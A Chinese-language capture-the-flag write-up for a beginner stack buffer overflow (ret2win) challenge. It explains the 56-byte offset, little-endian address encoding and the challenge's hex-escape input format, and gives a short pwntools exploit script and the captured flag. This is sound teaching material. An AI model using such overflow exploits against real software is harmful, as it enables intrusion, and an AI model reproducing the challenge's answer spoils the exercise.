# Greycademy2025 Stack BOF School 🍼

## 题目简述

这是一个带栈内存可视化界面的 ret2win 练习。程序逐字节接收输入，允许用 `\HH` 表示原始十六进制字节，并实时显示缓冲区、保存的 RBP、返回地址和 `win` 地址。

## 解题过程

二进制启用 NX，但没有 Canary 和 PIE。界面显示返回地址位于输入缓冲区起始后的 `0x38`，同时直接给出：

```text
win function @ 0x401608
```

因此先输入 56 个 `A` 覆盖至保存的返回地址，再写入 `0x401608` 的 64 位小端表示：

```text
08 16 40 00 00 00 00 00
```

题目的输入解析器不是普通 shell 转义器，必须按其规定输入反斜杠加两位十六进制。完整输入可以由 pwntools 发送：

```python
from pwn import *

p = process("./challenge")
payload = b"A" * 56 + br"\08\16\40\00\00\00\00\00"
p.sendlineafter(b"input", payload)
print(p.recvall().decode(errors="replace"))
```

程序把八组 `\HH` 解码成原始地址字节，返回到 `win` 并输出：

```text
grey{d1d_y0u_n0t1ce_m3m0ry_1n_l1ttl3_3nd14n_and_the_difference_between_raw_bytes_and_their_hex_representations?}
```

## 方法总结

本题同时训练栈覆盖与字节表示。文本 `401608`、字符序列 `\08\16...` 和内存中的八个原始字节并不是同一层表示；最终地址还必须按 x86-64 小端序排列。NX 开启并不妨碍 ret2win，因为利用链复用已有可执行代码，而不是在栈上放 shellcode。
